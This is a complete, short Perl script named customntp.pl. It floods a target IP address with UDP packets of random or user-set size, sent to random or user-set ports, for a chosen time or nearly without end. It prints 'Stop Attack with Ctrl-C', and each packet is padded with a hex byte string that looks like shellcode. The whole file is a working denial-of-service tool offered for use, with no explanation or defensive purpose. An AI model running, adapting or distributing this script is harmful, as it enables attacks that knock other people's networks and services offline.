use Socket;
use strict;
 
if ($#ARGV != 3) {
  print "perl customntp.pl <IP> <PORT> <PACKETSIZE> <SECONDS>\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "$ip Isn't a valid IP\n";
$endtime = time() + ($time ? $time : 9999999);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

print "Stop Attack with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, 
pack("a$psize","\x48\x29\xc6\x75\xe0\x49\x89\xfe\x5f\x59\x41\x59\x41\x56\xe8\x10\x00\x00\x00\x34\x2a\x68\x7e\xa2\xd0\x53\x60\xc9\x53\x10\x7a\xcb\xe8\x3e\x08\x5e\x48\x31\xc0\x49\x89\xf8\xc2\x80\xe2\x0f\x02\x1c\x16\x41\x8a\x14\x00\x41\x86\x14\x00\x00\x00\x00\x00"), 
0, pack_sockaddr_in($pport, $iaddr));}
